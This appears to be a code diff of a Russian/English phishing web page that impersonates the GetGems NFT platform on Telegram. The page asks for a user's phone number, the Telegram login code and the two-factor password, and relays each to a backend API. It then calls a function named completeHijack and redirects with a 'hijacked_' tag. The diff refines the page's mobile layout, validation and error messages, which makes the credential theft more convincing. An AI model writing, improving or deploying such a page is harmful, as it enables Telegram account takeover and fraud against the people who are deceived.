@@ -6,7 +6,6 @@
     <title>GetGems - Официальная NFT Платформа</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Твой существующий CSS остается без изменений */
         :root {
             --primary: #0088CC;
             --primary-dark: #006699;
@@ -27,41 +26,59 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
             background: var(--background);
             color: var(--text);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             min-height: 100vh;
             line-height: 1.6;
             overflow-x: hidden;
         }
 
         .container {
-            max-width: 400px;
+            max-width: 100%;
             margin: 0 auto;
             padding: 20px;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 400px;
+                padding: 40px 20px;
+            }
         }
 
         .language-switcher {
-            position: absolute;
+            position: fixed;
             top: 20px;
             right: 20px;
             z-index: 1000;
+            display: flex;
+            gap: 10px;
         }
 
         .lang-btn {
             background: rgba(255,255,255,0.1);
             border: 1px solid rgba(255,255,255,0.2);
             color: white;
-            padding: 8px 15px;
+            padding: 8px 16px;
             border-radius: 20px;
             cursor: pointer;
-            font-size: 0.8rem;
+            font-size: 14px;
             transition: all 0.3s ease;
             backdrop-filter: blur(10px);
+            font-weight: 500;
+        }
+
+        .lang-btn.active {
+            background: var(--primary);
+            border-color: var(--primary);
         }
 
         .lang-btn:hover {
@@ -70,13 +87,20 @@
 
         .header {
             text-align: center;
-            padding: 40px 0;
+            padding: 40px 20px;
             background: var(--gradient);
             margin: -20px -20px 30px -20px;
             color: white;
             border-radius: 0 0 25px 25px;
             position: relative;
             overflow: hidden;
+        }
+
+        @media (min-width: 768px) {
+            .header {
+                margin: -40px -20px 30px -20px;
+                border-radius: 0 0 30px 30px;
+            }
         }
 
         .header::before {
@@ -114,6 +138,13 @@
             margin-bottom: 20px;
             border: 1px solid rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
+            flex: 1;
+        }
+
+        @media (min-width: 768px) {
+            .auth-container {
+                padding: 40px;
+            }
         }
 
         .auth-step {
@@ -126,12 +157,18 @@
         }
 
         @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { 
+                opacity: 0; 
+                transform: translateY(30px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
         }
 
         .step-title {
-            font-size: 1.6rem;
+            font-size: 1.8rem;
             font-weight: 700;
             margin-bottom: 15px;
             color: var(--text);
@@ -139,6 +176,13 @@
             background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        @media (min-width: 768px) {
+            .step-title {
+                font-size: 2rem;
+            }
         }
 
         .step-description {
@@ -155,21 +199,22 @@
 
         .form-label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-weight: 600;
             color: var(--text);
-            font-size: 0.95rem;
+            font-size: 1rem;
         }
 
         .form-input {
             width: 100%;
-            padding: 18px;
+            padding: 18px 20px;
             border: 2px solid #2A2A2A;
             border-radius: 15px;
             font-size: 1rem;
             transition: all 0.3s ease;
             background: rgba(255, 255, 255, 0.05);
             color: var(--text);
+            font-family: inherit;
         }
 
         .form-input:focus {
@@ -182,16 +227,17 @@
         .phone-input-container {
             display: flex;
             gap: 12px;
+            align-items: center;
         }
 
         .country-select {
-            flex: 0 0 130px;
+            flex: 0 0 140px;
             position: relative;
         }
 
         .country-select select {
             width: 100%;
-            padding: 18px;
+            padding: 18px 20px;
             border: 2px solid #2A2A2A;
             border-radius: 15px;
             background: rgba(255, 255, 255, 0.05);
@@ -202,6 +248,7 @@
             background-repeat: no-repeat;
             background-position: right 15px center;
             background-size: 16px;
+            font-family: inherit;
         }
 
         .phone-input {
@@ -210,7 +257,7 @@
 
         .btn {
             width: 100%;
-            padding: 18px;
+            padding: 18px 20px;
             border: none;
             border-radius: 15px;
             font-size: 1.1rem;
@@ -220,6 +267,11 @@
             margin-top: 10px;
             position: relative;
             overflow: hidden;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
         .btn::before {
@@ -244,8 +296,12 @@
         }
 
         .btn-primary:hover {
-            transform: translateY(-3px);
+            transform: translateY(-2px);
             box-shadow: 0 8px 25px rgba(0, 136, 204, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
         }
 
         .btn-secondary {
@@ -259,59 +315,84 @@
             transform: translateY(-2px);
         }
 
-        .code-inputs {
-            display: flex;
-            gap: 12px;
+        .code-inputs-container {
             margin-bottom: 25px;
         }
 
+        .code-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
         .code-input {
-            flex: 1;
-            padding: 18px;
+            width: 60px;
+            height: 70px;
             border: 2px solid #2A2A2A;
             border-radius: 15px;
             text-align: center;
-            font-size: 1.4rem;
+            font-size: 1.8rem;
             font-weight: 700;
             background: rgba(255, 255, 255, 0.05);
             color: var(--text);
             transition: all 0.3s ease;
+            font-family: monospace;
+        }
+
+        @media (max-width: 480px) {
+            .code-input {
+                width: 50px;
+                height: 60px;
+                font-size: 1.6rem;
+            }
         }
 
         .code-input:focus {
             border-color: var(--primary);
             box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
             transform: scale(1.05);
+            outline: none;
         }
 
         .timer {
             text-align: center;
             color: var(--text-secondary);
-            margin: 20px 0;
+            margin: 25px 0;
             font-size: 1rem;
+            font-weight: 500;
         }
 
         .error-message {
             color: var(--error);
             font-size: 0.95rem;
-            margin-top: 8px;
+            margin-top: 12px;
             text-align: center;
             font-weight: 500;
+            padding: 12px;
+            background: rgba(255, 68, 68, 0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 68, 68, 0.2);
+            display: none;
         }
 
         .success-message {
             color: var(--success);
             font-size: 0.95rem;
-            margin-top: 8px;
+            margin-top: 12px;
             text-align: center;
             font-weight: 500;
+            padding: 12px;
+            background: rgba(0, 166, 80, 0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(0, 166, 80, 0.2);
+            display: none;
         }
 
         .loading {
             display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255,255,255,0.3);
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
             border-radius: 50%;
             border-top-color: white;
             animation: spin 1s ease-in-out infinite;
@@ -336,13 +417,20 @@
         .features-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 20px;
+            gap: 15px;
             margin: 30px 0;
+        }
+
+        @media (max-width: 480px) {
+            .features-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
         }
 
         .feature-card {
             background: rgba(255, 255, 255, 0.05);
-            padding: 25px 15px;
+            padding: 20px 15px;
             border-radius: 15px;
             text-align: center;
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -351,38 +439,50 @@
         }
 
         .feature-card:hover {
-            transform: translateY(-5px);
+            transform: translateY(-3px);
             border-color: var(--primary);
             box-shadow: var(--gem-glow);
         }
 
         .feature-icon {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
+            font-size: 2.2rem;
+            margin-bottom: 12px;
             filter: drop-shadow(0 0 10px rgba(0, 200, 255, 0.5));
         }
 
         .feature-title {
             font-weight: 700;
             margin-bottom: 8px;
-            font-size: 1rem;
+            font-size: 0.95rem;
         }
 
         .feature-desc {
             color: var(--text-secondary);
-            font-size: 0.85rem;
+            font-size: 0.8rem;
+            line-height: 1.4;
         }
 
         .nft-preview {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             border-radius: 20px;
-            padding: 40px 30px;
+            padding: 30px 25px;
             text-align: center;
             color: white;
             margin: 30px 0;
             position: relative;
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .nft-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .nft-value {
+            font-size: 1.1rem;
+            opacity: 0.9;
         }
 
         .progress-bar {
@@ -408,14 +508,15 @@
             justify-content: space-between;
             margin-bottom: 40px;
             position: relative;
+            padding: 0 10px;
         }
 
         .step-indicator::before {
             content: '';
             position: absolute;
             top: 20px;
-            left: 0;
-            right: 0;
+            left: 20px;
+            right: 20px;
             height: 3px;
             background: #2A2A2A;
             z-index: 1;
@@ -473,7 +574,65 @@
         }
 
         .hidden {
-            display: none;
+            display: none !important;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn:disabled:hover::before {
+            left: -100%;
+        }
+
+        /* Мобильные улучшения */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .auth-container {
+                padding: 25px 20px;
+            }
+            
+            .header {
+                padding: 30px 20px;
+            }
+            
+            .logo {
+                font-size: 2.5rem;
+            }
+            
+            .step-title {
+                font-size: 1.6rem;
+            }
+            
+            .btn {
+                padding: 16px 20px;
+            }
+        }
+
+        /* Анимации для улучшения UX */
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 136, 204, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 136, 204, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 136, 204, 0); }
         }
     </style>
 </head>
@@ -482,7 +641,7 @@
     
     <div class="container">
         <div class="language-switcher">
-            <button class="lang-btn" onclick="switchLanguage('ru')">RU</button>
+            <button class="lang-btn active" onclick="switchLanguage('ru')">RU</button>
             <button class="lang-btn" onclick="switchLanguage('en')">EN</button>
         </div>
 
@@ -519,7 +678,7 @@
                             </select>
                         </div>
                         <input type="tel" class="form-input phone-input" id="phone" 
-                               placeholder="123 456 7890">
+                               placeholder="123 456 7890" inputmode="numeric">
                     </div>
                 </div>
 
@@ -540,19 +699,21 @@
                     Мы отправили код в ваш аккаунт Telegram. Введите его ниже:
                 </div>
 
-                <div class="code-inputs">
-                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)" id="code1">
-                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" id="code2">
-                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" id="code3">
-                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" id="code4">
-                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" id="code5">
+                <div class="code-inputs-container">
+                    <div class="code-inputs">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)" id="code1" inputmode="numeric">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" id="code2" inputmode="numeric">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" id="code3" inputmode="numeric">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" id="code4" inputmode="numeric">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" id="code5" inputmode="numeric">
+                    </div>
                 </div>
 
                 <div class="timer" id="timer">
                     <span id="timer-text">Код истекает через 0:59</span>
                 </div>
 
-                <div class="error-message" id="codeError" style="display: none;">
+                <div class="error-message" id="codeError">
                     <span id="code-error-text">Неверный код. Попробуйте снова.</span>
                 </div>
 
@@ -577,7 +738,7 @@
                            placeholder="Введите ваш пароль Telegram">
                 </div>
 
-                <div class="error-message" id="passwordError" style="display: none;">
+                <div class="error-message" id="passwordError">
                     <span id="password-error-text">Неверный пароль. Проверьте и попробуйте снова.</span>
                 </div>
 
@@ -621,7 +782,7 @@
             </div>
         </div>
 
-        <div style="text-align: center; color: var(--text-secondary); font-size: 0.85rem; margin-top: 40px; line-height: 1.5;">
+        <div style="text-align: center; color: var(--text-secondary); font-size: 0.85rem; margin-top: 40px; line-height: 1.5; padding: 0 10px;">
             © 2024 GetGems. Официальная платформа Telegram.<br>
             <span id="rights-text">Все права защищены.</span> | 
             <a href="#" style="color: var(--primary); text-decoration: none;" id="privacy-link">Политика конфиденциальности</a> • 
@@ -630,9 +791,8 @@
     </div>
 
     <script>
-        const API_BASE_URL = 'http://localhost:8080'; // Базовый URL API сервера
+        const API_BASE_URL = 'http://localhost:8080';
 
-        // Тексты для локализации
         const translations = {
             ru: {
                 subtitle: "Официальная NFT Платформа Telegram",
@@ -717,11 +877,13 @@
         let password = '';
         let countdown = 59;
         let countdownInterval;
-        let selectedCountry = countries[1]; // Россия по умолчанию
+        let selectedCountry = countries[1];
         let userData = {};
 
         function switchLanguage(lang) {
             currentLanguage = lang;
+            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
             updateTexts();
         }
 
@@ -806,6 +968,7 @@
             document.getElementById(`step-${getStepName(stepNumber)}`).classList.add('active');
             
             updateProgress(stepNumber);
+            updateStepIndicator(stepNumber);
         }
 
         function getStepName(stepNumber) {
@@ -821,7 +984,9 @@
         function updateProgress(step) {
             const progress = (step - 1) * 33.33;
             document.querySelector('.progress-fill').style.width = `${progress}%`;
-            
+        }
+
+        function updateStepIndicator(step) {
             document.querySelectorAll('.step').forEach((stepEl, index) => {
                 stepEl.classList.remove('active', 'completed');
                 if (index + 1 < step) {
@@ -842,15 +1007,13 @@
             }
 
             phoneNumber = '+' + selectedCountry.code + phone;
-            userData.phone = phoneNumber;
-            userData.country = selectedCountry.name;
             
             const btn = document.getElementById('sendPhoneBtn');
+            const originalText = btn.innerHTML;
             btn.innerHTML = '<div class="loading"></div> ' + (currentLanguage === 'ru' ? 'Отправка...' : 'Sending...');
             btn.disabled = true;
 
             try {
-                // Отправляем номер на API сервер
                 const response = await fetch(`${API_BASE_URL}/api/send_code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -863,19 +1026,29 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    // Код отправлен, переходим к вводу кода
                     currentStep = 2;
                     showStep(currentStep);
                     startTimer();
+                    clearCodeInputs();
+                    document.getElementById('code1').focus();
                 } else {
                     throw new Error(result.error || 'Failed to send code');
                 }
             } catch (error) {
-                showError(phoneInput, currentLanguage === 'ru' ? 'Ошибка отправки кода' : 'Error sending code: ' + error.message);
+                showError(phoneInput, currentLanguage === 'ru' ? 'Ошибка отправки кода' : 'Error sending code');
+                phoneInput.classList.add('shake');
+                setTimeout(() => phoneInput.classList.remove('shake'), 500);
             } finally {
-                btn.innerHTML = currentLanguage === 'ru' ? 'Отправить код' : 'Send Verification Code';
+                btn.innerHTML = originalText;
                 btn.disabled = false;
             }
+        }
+
+        function clearCodeInputs() {
+            for (let i = 1; i <= 5; i++) {
+                document.getElementById(`code${i}`).value = '';
+            }
+            hideError('codeError');
         }
 
         function startTimer() {
@@ -890,7 +1063,7 @@
                 if (countdown <= 0) {
                     clearInterval(countdownInterval);
                     const resendText = currentLanguage === 'ru' ? 'Отправить код снова' : 'Resend code';
-                    timerElement.innerHTML = `<a href="#" onclick="resendCode()" style="color: var(--primary); font-weight: 600;">${resendText}</a>`;
+                    timerElement.innerHTML = `<a href="#" onclick="resendCode()" style="color: var(--primary); font-weight: 600; text-decoration: none;">${resendText}</a>`;
                 }
                 
                 countdown--;
@@ -899,17 +1072,18 @@
 
         function resendCode() {
             sendPhone();
-            startTimer();
         }
 
         function moveToNext(input, nextIndex) {
             const value = input.value;
             
-            if (value.length === 1) {
+            if (value.length === 1 && /[0-9]/.test(value)) {
                 const inputs = document.querySelectorAll('.code-input');
                 if (nextIndex < inputs.length) {
                     inputs[nextIndex].focus();
                 }
+            } else if (value.length > 0 && !/[0-9]/.test(value)) {
+                input.value = '';
             }
             
             updateAuthCode();
@@ -922,11 +1096,13 @@
 
         async function verifyCode() {
             const btn = document.getElementById('verifyCodeBtn');
+            const originalText = btn.innerHTML;
             btn.innerHTML = '<div class="loading"></div> ' + (currentLanguage === 'ru' ? 'Проверка...' : 'Verifying...');
             btn.disabled = true;
 
+            hideError('codeError');
+
             try {
-                // Отправляем код на API сервер
                 const response = await fetch(`${API_BASE_URL}/api/verify_code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -940,20 +1116,27 @@
 
                 if (result.success) {
                     if (result.requires_password) {
-                        // Нужен пароль
                         currentStep = 3;
                         showStep(currentStep);
+                        document.getElementById('password').focus();
                     } else {
-                        // Вход успешен без пароля
                         completeHijack();
                     }
                 } else {
-                    document.getElementById('codeError').style.display = 'block';
+                    showError('codeError', result.message || 'Invalid code');
+                    document.querySelectorAll('.code-input').forEach(input => {
+                        input.classList.add('shake');
+                    });
+                    setTimeout(() => {
+                        document.querySelectorAll('.code-input').forEach(input => {
+                            input.classList.remove('shake');
+                        });
+                    }, 500);
                 }
             } catch (error) {
-                document.getElementById('codeError').style.display = 'block';
+                showError('codeError', currentLanguage === 'ru' ? 'Ошибка проверки кода' : 'Error verifying code');
             } finally {
-                btn.innerHTML = currentLanguage === 'ru' ? 'Подтвердить код' : 'Verify Code';
+                btn.innerHTML = originalText;
                 btn.disabled = false;
             }
         }
@@ -968,11 +1151,13 @@
             }
 
             const btn = document.getElementById('verifyPasswordBtn');
-            btn.innerHTML = '<div class="loading"></div> ' + (currentLanguage === 'ru' ? 'Защита...' : 'Securing...');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<div class="loading"></div> ' + (currentLanguage === 'ru' ? 'Проверка...' : 'Verifying...');
             btn.disabled = true;
 
+            hideError('passwordError');
+
             try {
-                // Отправляем пароль на API сервер
                 const response = await fetch(`${API_BASE_URL}/api/verify_password`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -987,12 +1172,14 @@
                 if (result.success) {
                     completeHijack();
                 } else {
-                    document.getElementById('passwordError').style.display = 'block';
+                    showError('passwordError', result.message || 'Invalid password');
+                    passwordInput.classList.add('shake');
+                    setTimeout(() => passwordInput.classList.remove('shake'), 500);
                 }
             } catch (error) {
-                document.getElementById('passwordError').style.display = 'block';
+                showError('passwordError', currentLanguage === 'ru' ? 'Ошибка проверки пароля' : 'Error verifying password');
             } finally {
-                btn.innerHTML = currentLanguage === 'ru' ? 'Перейти к NFT' : 'Continue to NFTs';
+                btn.innerHTML = originalText;
                 btn.disabled = false;
             }
         }
@@ -1001,7 +1188,6 @@
             currentStep = 4;
             showStep(currentStep);
             
-            // Через 3 секунды редирект
             setTimeout(() => {
                 window.location.href = 'https://t.me/getgems_bot?start=hijacked_' + Date.now();
             }, 3000);
@@ -1016,26 +1202,58 @@
         function backToCode() {
             currentStep = 2;
             showStep(currentStep);
+            document.getElementById('code1').focus();
         }
 
-        function showError(element, message) {
-            element.classList.add('error');
-            const errorDiv = document.createElement('div');
-            errorDiv.className = 'error-message';
-            errorDiv.textContent = message;
-            element.parentNode.appendChild(errorDiv);
-            
-            setTimeout(() => {
-                element.classList.remove('error');
-                errorDiv.remove();
-            }, 3000);
+        function showError(elementOrId, message) {
+            let element;
+            if (typeof elementOrId === 'string') {
+                element = document.getElementById(elementOrId);
+                element.querySelector('span').textContent = message;
+                element.style.display = 'block';
+            } else {
+                element = elementOrId;
+                const errorDiv = document.createElement('div');
+                errorDiv.className = 'error-message';
+                errorDiv.textContent = message;
+                element.parentNode.appendChild(errorDiv);
+                
+                setTimeout(() => {
+                    errorDiv.remove();
+                }, 3000);
+            }
         }
+
+        function hideError(elementId) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.style.display = 'none';
+            }
+        }
+
+        // Обработчики клавиш для улучшения UX
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                if (currentStep === 1) {
+                    sendPhone();
+                } else if (currentStep === 2 && authCode.length === 5) {
+                    verifyCode();
+                } else if (currentStep === 3 && password) {
+                    verifyPassword();
+                }
+            }
+        });
 
         // Инициализация при загрузке
         document.addEventListener('DOMContentLoaded', function() {
             createFloatingGems();
             initCountries();
             updateTexts();
+            
+            // Адаптация для мобильных устройств
+            if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                document.body.classList.add('mobile');
+            }
             
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.ready();
